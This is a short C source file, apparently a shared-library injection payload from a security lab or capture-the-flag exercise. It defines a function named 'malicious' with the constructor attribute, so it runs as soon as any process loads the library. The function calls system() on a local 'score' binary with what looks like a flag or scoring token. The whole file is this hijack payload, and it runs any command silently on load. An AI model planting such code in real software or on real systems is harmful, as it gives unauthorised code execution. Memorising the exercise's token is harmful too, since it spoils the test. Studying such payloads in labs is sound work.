#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 9fd65668-4c96-479f-828d-f80821ab3014");
}
